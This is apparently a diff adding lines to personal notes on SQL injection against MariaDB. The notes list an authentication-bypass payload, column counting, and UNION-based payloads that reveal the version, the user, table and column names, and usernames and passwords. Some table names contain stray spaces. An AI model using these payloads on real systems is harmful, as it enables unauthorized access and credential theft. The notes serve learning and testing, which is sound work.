@@ -747,7 +747,9 @@ Tricks:
 - Bypass authentication (hashtag starts a comment for Mariadb): `tom’ or 1=1;#`
 - Adding `LIMIT 1;#` in the end would just fetch one row. This may be useful when the login is trying to fetch the user that is logging in, and given that 1=1 is true for all of them it may return several rows. Adding the limit keyword it would return just the first one.
 - Get number of columns: add `order by 1` then `order by 2` etc until you get an error to be able to infer the number of columns a table has
-
-
-
-
+- Once we know the number of columns that are being retrieved in the query, we may want to know which of them are the ones we see in the responses. Adding `union all select 1,2,3,..,ncolumns` will display an extra row with the column numbers that are being returned (to detect what we aren't seeing).
+- Get db version: `union all select 1, 2, @@version`
+- Get user: `union all select 1, 2, user()`
+- Get table name: `union all select 1, 2, table_name from information_sc hema.tables`
+- Get column names: `union all select 1, 2, column_name from information_s chema.columns where table_name='users'`
+- Add other query using obtained info: `union all select 1, username, password from users`
